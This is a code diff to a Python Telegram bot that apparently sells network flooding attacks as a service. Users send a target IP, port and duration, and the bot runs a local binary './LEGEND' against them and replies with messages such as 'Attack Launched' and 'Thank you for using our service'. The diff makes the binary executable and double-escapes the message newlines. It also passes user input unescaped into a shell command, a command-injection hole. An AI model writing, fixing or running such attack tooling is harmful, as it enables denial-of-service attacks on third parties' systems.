@@ -19,6 +19,11 @@ async def start(update: Update, context: CallbackContext):
 
 async def run_attack(chat_id, ip, port, duration, context):
     try:
+        if not os.path.exists("./LEGEND"):
+            raise FileNotFoundError("The binary './LEGEND' does not exist.")
+        if not os.access("./LEGEND", os.X_OK):
+            os.chmod("./LEGEND", 0o755)
+
         process = await asyncio.create_subprocess_shell(
             f"./LEGEND {ip} {port} {duration}",
             stdout=asyncio.subprocess.PIPE,
@@ -27,15 +32,15 @@ async def run_attack(chat_id, ip, port, duration, context):
         stdout, stderr = await process.communicate()
 
         if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
+            print(f"[stdout]\\n{stdout.decode()}")
         if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
+            print(f"[stderr]\\n{stderr.decode()}")
 
     except Exception as e:
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
 
     finally:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\\n*Thank you for using our service!*", parse_mode='Markdown')
 
 async def attack(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
@@ -53,9 +58,9 @@ async def attack(update: Update, context: CallbackContext):
 
     ip, port, duration = args
     await context.bot.send_message(chat_id=chat_id, text=( 
-        f"*⚔️ Attack Launched! ⚔️*\n"
-        f"*🎯 Target: {ip}:{port}*\n"
-        f"*🕒 Duration: {duration} seconds*\n"
+        f"*⚔️ Attack Launched! ⚔️*\\n"
+        f"*🎯 Target: {ip}:{port}*\\n"
+        f"*🕒 Duration: {duration} seconds*\\n"
         f"*🔥 Let the battlefield ignite! 💥*"
     ), parse_mode='Markdown')
 
